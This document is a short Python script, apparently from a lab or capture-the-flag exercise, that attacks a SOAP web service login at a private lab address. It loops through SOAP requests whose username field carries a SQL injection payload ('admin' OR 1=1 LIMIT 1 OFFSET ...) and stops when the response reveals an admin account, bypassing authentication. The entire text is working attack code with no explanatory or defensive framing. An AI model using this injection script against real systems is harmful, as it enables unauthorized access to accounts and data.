___

```python
import requests, sys
import xml.etree.ElementTree as ET

for i in range(100):
    craft= f"""OR 1=1 LIMIT 1 OFFSET {i}"""
    payload = f"""
             <?xml version="1.0" encoding="utf-8"?>
                <soap:Envelope
                    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                    xmlns:tns="http://tempuri.org/"
                    xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
                    <soap:Body>
                       <LoginRequest xmlns="http://tempuri.org/">
                          <username> admin'{craft}-- - </username>
                          <password> password </password>
                       </LoginRequest>
                    </soap:Body>
                </soap:Envelope>
            """

    res = requests.post("http://10.129.156.12:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'})
    if "admin" in res.content.decode():
        print(res.request.body)
        print("\n"+ res.text)
        sys.exit(0)
```
